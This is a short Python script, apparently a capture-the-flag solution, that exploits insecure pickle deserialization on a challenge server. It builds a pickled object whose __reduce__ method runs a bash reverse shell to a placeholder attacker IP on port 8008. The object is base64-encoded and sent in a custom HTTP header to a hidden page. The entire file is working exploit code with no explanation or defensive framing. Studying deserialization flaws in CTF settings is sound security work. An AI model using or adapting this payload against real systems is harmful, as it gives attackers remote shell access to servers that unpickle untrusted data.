import pickle
import base64
import os
import requests

class RCE:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER IP/8008 0>&1'",))

payload = pickle.dumps(RCE())
encoded_payload = base64.b64encode(payload).decode()

headers = {"X-Serial-Token": encoded_payload}


response = requests.get("http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7", headers=headers)
print(response.text)
